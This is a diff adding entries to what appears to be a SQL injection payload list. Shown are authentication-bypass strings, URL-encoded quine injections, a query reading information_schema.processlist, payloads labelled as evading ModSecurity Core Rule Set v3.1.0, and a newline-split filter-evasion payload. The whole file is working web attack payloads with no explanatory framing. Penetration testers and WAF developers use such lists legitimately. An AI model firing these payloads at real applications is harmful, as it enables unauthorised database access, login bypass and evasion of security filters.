@@ -73,3 +73,17 @@ admin") or "1"="1"--
 admin") or "1"="1"#
 admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+
+#QUINES
+1%27%20union%20SELECT%20REPLACE%28REPLACE%28%271%22%20union%20SELECT%20REPLACE%28REPLACE%28%22%24%22%2CCHAR%2834%29%2CCHAR%2839%29%29%2CCHAR%2836%29%2C%22%24%22%29%20AS%20Quine%23%27%2CCHAR%2834%29%2CCHAR%2839%29%29%2CCHAR%2836%29%2C%271%22%20union%20SELECT%20REPLACE%28REPLACE%28%22%24%22%2CCHAR%2834%29%2CCHAR%2839%29%29%2CCHAR%2836%29%2C%22%24%22%29%20AS%20Quine%23%27%29%20AS%20Quine%23
+a%27%20union%20select%20replace%28replace%28%27a%22%20union%20select%20replace%28replace%28%22%24%22%2Cchar%2834%29%2Cchar%2839%29%29%2Cchar%2836%29%2C%22%24%22%29%20as%20quine%2D%2D%20%2D%27%2Cchar%2834%29%2Cchar%2839%29%29%2Cchar%2836%29%2C%27a%22%20union%20select%20replace%28replace%28%22%24%22%2Cchar%2834%29%2Cchar%2839%29%29%2Cchar%2836%29%2C%22%24%22%29%20as%20quine%2D%2D%20%2D%27%29%20as%20quine%2D%2D%20%2D
+
+#information_schema
+' union select (select mid(info,38,84) from information_schema.processlist limit 1)%23
+
+#ModSecurity Core Rule Set v3.1.0
+%2D1%27%3C%40%3D1%20OR%20%7Ba%201%7D%3D1%23
+1'<@=1 OR {a 1}=1 limit 1,2#
+%2D1%27%3C%40%3D1%20OR%20%7Ba%201%7D%3D1%20limit%201%2C2%23
+
+1'%23&pw=%0Aunion/**/select 0x6669727374, 0x7365636f6e64''%23
